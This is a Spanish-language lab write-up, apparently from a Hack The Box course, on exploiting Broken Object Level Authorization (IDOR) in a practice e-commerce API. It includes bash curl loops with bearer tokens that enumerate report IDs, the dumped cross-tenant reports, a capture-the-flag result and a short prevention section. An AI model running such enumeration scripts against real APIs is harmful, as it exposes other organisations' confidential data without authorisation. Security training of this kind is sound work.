
# Broken Object Level Authorization

Las API web permiten a los usuarios solicitar datos o registros mediante el envío de diversos parámetros, incluyendo identificadores únicos como `Universally Unique Identifiers`(`UUIDs`), también conocidos como `Globally Unique Identifiers`(`GUIDs`), e identificadores enteros. Sin embargo, no verificar de forma correcta y segura que un usuario posee la propiedad y el permiso para ver un recurso específico `object-level authorization mechanisms` puede provocar la exposición de datos y vulnerabilidades de seguridad.

Un endpoint API web es vulnerable a `Broken Object Level Authorization`(`BOLA`), también conocido como `Insecure Direct Object Reference`(`IDOR`), si sus verificaciones de autorización (implementadas en el nivel del código fuente) no logran garantizar correctamente que un usuario autenticado tenga suficientes permisos o privilegios para solicitar y ver datos específicos o realizar ciertas operaciones.

### Omisión de autorización mediante clave controlada por el usuario <a href="#authorization-bypass-through-user-controlled-key" id="authorization-bypass-through-user-controlled-key"></a>

El punto final contra el que practicaremos es vulnerable a [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).

#### Escenario <a href="#scenario" id="scenario"></a>

El administrador de `Inlanefreight E-Commerce Marketplace` nos ha proporcionado las credenciales `htbpentester1@pentestercompany.com:HTBPentester1` y quiere que evaluemos qué vulnerabilidades de API puede explotar el usuario con sus roles asignados.

Dado que la cuenta pertenece a un proveedor, utilizaremos el endpoint `/api/v1/authentication/suppliers/sign-in` para iniciar sesión y obtener un JWT:

![GIF que muestra el uso de Swagger UI para enviar una solicitud a una llamada API.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/Authenitcation_Suppliers.gif)

Para autenticarnos con el JWT, lo copiaremos de la respuesta y haremos clic en el botón `Authorize`. Observe el icono del candado, actualmente desbloqueado, que indica que no estamos autenticados. A continuación, pegaremos el JWT en el campo `Value` de la ventana emergente `Available authorizations` y haremos clic en `Authorize`. Al finalizar, el icono del candado estará completamente bloqueado, confirmando nuestra autenticación.

![GIF que muestra la autorización mediante un token JWT.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/Authentication_Suppliers_2.gif)

Al examinar los endpoints dentro del grupo Suppliers (observe cómo tienen un candado en su extremo derecho, lo que indica que se requiere autenticación), notaremos uno llamado `/api/v1/suppliers/current-user`:

![Interfaz de usuario Swagger para API de proveedores. Puntos finales: Obtener todos los proveedores, obtener proveedores por ID, contar proveedores por nombre, obtener el proveedor actual, obtener todos los informes trimestrales, obtener informes por ID.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_5.png)

Los endpoints que contienen `current-user` en su ruta indican que utilizan el JWT del usuario autenticado para realizar la operación especificada, que en este caso es recuperar los datos del usuario actual. Al invocar el endpoint, recuperaremos la empresa del usuario actual `ID`, con un valor `Guid`: `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`

![Solicitud GET para /api/v1/supplier-companies/current-user. Sin parámetros. Respuesta: Detalles de la empresa proveedora con ID, nombre "PentesterCompany", correo electrónico y otros atributos.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_6.png)

Recuperemos entonces los roles de nuestro usuario actual. Tras invocar el endpoint `/api/v1/roles/current-user`, este responde con el rol  `SupplierCompanies_GetYearlyReportByID`:

![Solicitud GET para /api/v1/roles/current-user. Sin parámetros. Respuesta: Roles del usuario, incluido "SupplierCompanies\_GetYearlyReportByID".](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_7.png)

En el grupo `Supplier-Companies`, encontramos un endpoint relacionado con el rol `SupplierCompanies_GetYearlyReportByID` que acepta un parámetro GET `/api/v1/supplier-companies/yearly-reports/{ID}`:

![Endpoints de API de empresas proveedoras](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_8.png)

Al expandirlo, notaremos que requiere el rol `SupplierCompanies_GetYearlyReportByID` y acepta el parámetro `ID` como un entero y no un `Guid`:

![Solicitud GET para /api/v1/supplier-companies/yearly-reports/{ID}. Requiere el rol: SupplierCompanies\_GetYearlyReportByID. Parámetro: ID (entero). Respuesta: JSON con mensaje de error.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_9.png)

Si usamos `1` como `ID`, recibiremos un informe anual perteneciente a una empresa con el ID `f9e58492-b594-4d82-a4de-16e4f230fce1`, que no es al que pertenecemos, `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`:

![Solicitud GET para /api/v1/supplier-companies/yearly-reports/1. Respuesta: Informe anual con ID 1, ID de empresa, año 2020, ingresos 794425112 y comentarios de la alta dirección elogiando el rendimiento.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_10.png)

Al probar otras identificaciones, aún podemos acceder a informes anuales de otras empresas proveedoras, lo que nos permite acceder a datos comerciales potencialmente confidenciales:

![Solicitud GET para /api/v1/supplier-companies/yearly-reports/13. Respuesta: Informe anual con ID 13, ID de empresa, año 2020, ingresos 588820631 y comentarios de la alta dirección elogiando la dedicación.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/API1_2023_Broken_Object_Level_Authorization_Image_11.png)

Además, podemos abusar masivamente de la vulnerabilidad `BOLA` y obtener los primeros 20 informes anuales de las empresas proveedoras:

![GIF que muestra el abuso masivo de BOLA para obtener los primeros 20 informes anuales.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/268/BOLA_Mass_Abuse.gif)

Los únicos cambios que debemos realizar al comando cURL copiado desde la `Swagger`interfaz son usar un Bash `for-loop`con `variable interpolation`, agregar una nueva línea después de cada respuesta usando el indicador `-w "\n"`, silenciar el progreso usando el indicador `-s`y canalizar la salida a [jq](https://jqlang.github.io/jq/) :

```bash
afsh4ck@kali$ for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done

{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 2,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2022,
    "revenue": 339322952,
    "commentsFromCLevel": "Excellent performance! The Board is exhilarated! Prepare for a special vacation adventure!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 3,
    "companyID": "058ac1e5-3807-47f3-b546-cc069366f8f9",
    "year": 2020,
    "revenue": 186208503,
    "commentsFromCLevel": "Phenomenal performance! The Board is deeply impressed! Everyone will be treated to a deluxe vacation!"
  }
}

<SNIP>

```

#### Prevención <a href="#prevention" id="prevention"></a>

Para mitigar la vulnerabilidad `BOLA`, el endpoint `/api/v1/supplier-companies/yearly-reports` debe implementar una verificación (a nivel de código fuente) para garantizar que los usuarios autorizados solo puedan acceder a los informes anuales asociados a su empresa afiliada. Esta verificación implica comparar el campo `companyID` del informe con el del proveedor autenticado `companyID`. El acceso solo se concederá si estos valores coinciden; de lo contrario, se denegará la solicitud. Este enfoque mantiene eficazmente la segregación de datos entre los informes anuales de las empresas proveedoras.

***

## <mark style="color:purple;">Caso práctico</mark>

```
Objetivo: 94.237.63.174:31468
```

#### Explota otra vulnerabilidad de autorización de nivel de objeto roto y envia la flag.

{% code overflow="wrap" %}

```
Autentíquese en 94.237.63.174, con el usuario "htbpentester2@pentestercompany.com" y la contraseña "HTBPentester2"
```

{% endcode %}

Vamos a Autenthication y en el request body ponemos nuestras credenciales:

<figure><img src="/files/tIOFhBY0hRv33Dwloyw7" alt=""><figcaption></figcaption></figure>

Al darle a execute nos devuelve el token JWT:

<figure><img src="/files/c4JkoWldwjoeddvsBtgx" alt=""><figcaption></figcaption></figure>

Copiamos el valor del token y le damos a authorize:

<figure><img src="/files/q4ppNNHSxaxNteuALAQp" alt=""><figcaption></figcaption></figure>

Al ver el endpoint `/current-user` nos da el ID de la empresa que no es a la que pertenecemos:&#x20;

```
b75a7c76-e149-4ca7-9c55-d9fc4ffa87be
```

<figure><img src="/files/R4te03Gb3wkbb25cEma9" alt=""><figcaption></figcaption></figure>

Y si vamos a /quarterly-reports/{ID} podemos dumpear informes confidenciales de esa empresa usando un ID entero:

<figure><img src="/files/i2OXdUMYJpE9QcR11H69" alt=""><figcaption></figcaption></figure>

Por lo que usaremos el siguiente script para dumpearlos:

```bash
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.63.174:31468/api/v1/suppliers/quarterly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc2NjQyMTcxNSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.U7GfYrhe_9TFHz1c-EYhc3we9k5UU_Q-8aqfRouxhZtju_JCFVqkSs4Mae1ctXDC-ZpRegJvmyzkB8_hJ4kQew' | jq
done

{
  "supplierQuarterlyReport": {
    "id": 1,
    "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
    "quarter": 4,
    "year": 2020,
    "amountSold": 678509,
    "commentsFromManager": "Incredible dedication! I'm absolutely delighted with your hard work! A surprise vacation awaits you!"
  }
}
{
  "supplierQuarterlyReport": {
    "id": 2,
    "supplierID": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
    "quarter": 3,
    "year": 2022,
    "amountSold": 608221,
    "commentsFromManager": "Remarkable dedication! I'm full of admiration for your efforts! Get ready for a custom-tailored reward!"
  }
}
<SNIP>
{
  "supplierQuarterlyReport": {
    "id": 8,
    "supplierID": "b2d1a1a9-d5bb-4973-bbe4-9a605b6f0da4",
    "quarter": 3,
    "year": 2023,
    "amountSold": 10000,
    "commentsFromManager": "HTB{e76651e1f516eb5d726062**********}"
  }
}
```

Tenemos la flag!
